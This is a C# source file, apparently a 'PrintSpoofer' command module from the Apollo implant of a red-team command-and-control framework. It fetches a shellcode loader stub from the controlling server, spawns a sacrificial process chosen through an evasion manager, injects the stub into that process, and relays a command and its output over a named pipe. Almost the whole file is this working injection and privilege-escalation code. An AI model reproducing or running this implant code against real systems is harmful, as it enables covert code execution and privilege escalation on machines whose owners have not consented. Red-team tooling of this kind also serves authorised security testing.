#define COMMAND_NAME_UPPER

#if DEBUG
#undef PRINTSPOOFER
#define PRINTSPOOFER
#endif

#if PRINTSPOOFER

using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Reflection = System.Reflection;
using Apollo.Jobs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.IO.Pipes;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization;
using System.Diagnostics;
using System.IO;
using IPC;
using Apollo.Tasks;
using Apollo.Evasion;

namespace Apollo.CommandModules
{
    class PrintSpoofer
    {
        private static byte[] loaderStub;


        /// <summary>
        /// Execute an arbitrary C# assembly in a sacrificial process
        /// that respects the current caller's token.
        /// </summary>
        /// <param name="job">
        /// Job associated with this task. job.Task.parameters
        /// should contain a JSON structure with key "assembly" that
        /// has an associated Apfell file ID to pull from the server.
        /// This assembly is position-independent code generated from
        /// donut with arguments baked in.
        /// </param>
        /// <param name="agent">Agent this task is run on.</param>
        public static void Execute(Job job, Agent implant)
        {
            Task task = job.Task;
            string sacrificialApplication;
            string commandLine = "";
            string command = "";
            string loaderStubID;
            string pipeName;
            JObject json;
            List<string> output = new List<string>();

            /*
             * Response from the server should be of the form:
             * {
             * "assembly_name": "registered assembly name",
             * "loader_stub_id": "File ID of the loader stub",
             * "pipe_name": "named pipe to connect to",
             * "assembly_arguments": "command line arguments to send",
             * }
             */
            //ProcessWithAnonymousPipeIO sacrificialProcess = null;
            SacrificialProcesses.SacrificialProcess sacrificialProcess = null;
            try
            {
                json = (JObject)JsonConvert.DeserializeObject(task.parameters);
            }
            catch (Exception ex)
            {
                task.status = "error";
                task.message = $"Error deserializing task parameters. Malformed JSON. System exception: {ex.Message}\n\nTask Parameters:\n{task.parameters}";
                return;
            }

            loaderStubID = json.Value<string>("loader_stub_id");
            // Reset the loader stub each time as a new named pipe is given to us from on high.
            loaderStub = null;
            try
            {
                loaderStub = implant.Profile.GetFile(task.id, loaderStubID, implant.Profile.ChunkSize);
            }
            catch (Exception ex)
            {
                task.status = "error";
                task.message = $"Failed to fetch loader stub for PrintSpoofer. Reason: {ex.Message}.\nParameters:\n{task.parameters}";
                return;
            }
            if (loaderStub == null || loaderStub.Length == 0)
            {
                job.Task.status = "error";
                job.Task.message = String.Format("Unable to retrieve DLL shellcode stub with ID {0}", loaderStubID);
                return;
            }

            pipeName = json.Value<string>("pipe_name");
            if (string.IsNullOrEmpty(pipeName))
            {
                job.Task.status = "error";
                job.Task.message = "No pipe name was given to DLL to start the named pipe server.";
                return;
            }

            if (implant.architecture == "x64")
                sacrificialApplication = EvasionManager.SpawnTo64;
            else
                sacrificialApplication = EvasionManager.SpawnTo86;

            try
            {
                // Technically we don't need the named pipe IO, but this class already has implemented what we need for
                // various token impersonation things, so why not.
                //if (implant.HasAlternateToken())
                //{
                //    sacrificialProcess = new ProcessWithAnonymousPipeIO(sacrificialApplication, commandLine, Win32.Advapi32.ProcessCreationFlags.CREATE_SUSPENDED, true, false);
                //}
                //else if (implant.HasCredentials())
                //{
                //    sacrificialProcess = new ProcessWithAnonymousPipeIO(sacrificialApplication, commandLine, Win32.Advapi32.ProcessCreationFlags.CREATE_SUSPENDED, false, true);
                //}
                //else
                //{
                //    sacrificialProcess = new ProcessWithAnonymousPipeIO(sacrificialApplication, commandLine, Win32.Advapi32.ProcessCreationFlags.CREATE_SUSPENDED);
                //}

                // Deal with tokens later....

                sacrificialProcess = new SacrificialProcesses.SacrificialProcess(sacrificialApplication, commandLine, true);

                if (sacrificialProcess.Start())
                {
                    job.ProcessID = (int)sacrificialProcess.PID;
                    job.sacrificialProcess = sacrificialProcess;
                    ApolloTaskResponse response; //= new SCTaskResp(job.Task.id, false, String.Format("Sacrificial process spawned with PID: {0}", sacrificialProcess.PID), "");
                                                 //implant.TryPostResponse(response);
                                                 ////byte[] tempBytes = File.ReadAllBytes("C:\\Users\\Public\\helloworldsc_noargs.bin");
                    if (sacrificialProcess.Inject(loaderStub))
                    {
                        //sacrificialProcess.CreateNewRemoteThread(tempBytes);
                        //sacrificialProcess.ResumeThread();
                        // bool bRet = sacrificialProcess.StillActive();
                        NamedPipeClientStream pipeClient = new NamedPipeClientStream(pipeName);

                        pipeClient.Connect(30000);

                        StreamWriter writer;
                        try
                        {
                            writer = new StreamWriter(pipeClient);
                            command = json.Value<string>("command");
                            writer.Write(command);
                            writer.Flush();
                            using (StreamReader sr = new StreamReader(pipeClient))
                            {
                                //sr.ReadLine();
                                var line = sr.ReadLine();
                                while (line != null && line.ToUpper().Trim() != "EOF")
                                {
                                    job.AddOutput(line);
                                    line = sr.ReadLine();
                                }
                            }
                            if (pipeClient.IsConnected)
                                writer.Close();
                            job.SetComplete();
                        }
                        catch (Exception ex)
                        {
                            job.SetError(String.Format("Error while reading from stream: {0}", ex.Message));
                        }
                    }
                    else
                    {
                        job.SetError($"Failed to inject loader stub: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}");
                    }
                }
                else
                {
                    job.SetError($"Failed to start sacrificial process: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}");
                }
            }
            catch (Exception ex)
            {
                if (sacrificialProcess != null)
                {
                    job.SetError(String.Format("Error in PrintSpoofer (PID: {0}). Reason: {1}", sacrificialProcess.PID, ex.Message));
                }
                else
                {
                    job.SetError(String.Format("Error in PrintSpoofer. Reason: {0}", ex.Message));
                }
            }
            finally
            {
                if (!sacrificialProcess.HasExited)
                    sacrificialProcess.Kill();
            }
        }
    }
}
#endif